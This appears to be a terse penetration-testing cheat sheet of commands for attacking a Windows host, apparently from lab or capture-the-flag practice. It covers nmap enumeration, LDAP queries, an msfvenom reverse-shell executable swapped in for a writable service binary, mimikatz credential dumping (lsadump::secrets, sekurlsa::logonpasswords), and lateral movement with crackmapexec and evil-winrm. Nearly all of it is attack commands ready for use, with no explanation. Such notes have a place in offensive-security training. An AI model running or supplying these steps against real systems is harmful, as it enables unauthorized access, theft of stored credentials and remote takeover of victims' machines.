# Service Enumeration
```python
nmap -sC -sV -Pn -n -p- --min-rate=400 --min-parallelism=512 [ip]

nmap -sV -sC -T5 -Pn [ip]

nmap -sS -sC -sV -T5 -Pn [ip]
```

# Initial Access
```python
ldapsearch -x -b "dc=,dc=" -H ldap://ip

ssh user@ip
```

# Privilege Escalation
```python
icacls "file modifiable"

msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=662 -f exe > shell.exe

move "file modifiable"
curl "file shell" -o "file modifiable"
shutdown /r /t 1

whoami
hostname
ipconfig

curl "file mimikatz" -o "file mimikatz"
mimikatz.exe
privilege
lsadump::secrets
sekurlsa::logonpasswords

net user [user] /domain

crackmapexec winrm [ip] -u [user] -p [pass]

evil-winrm -i [ip] -u [user] -p [pass]
```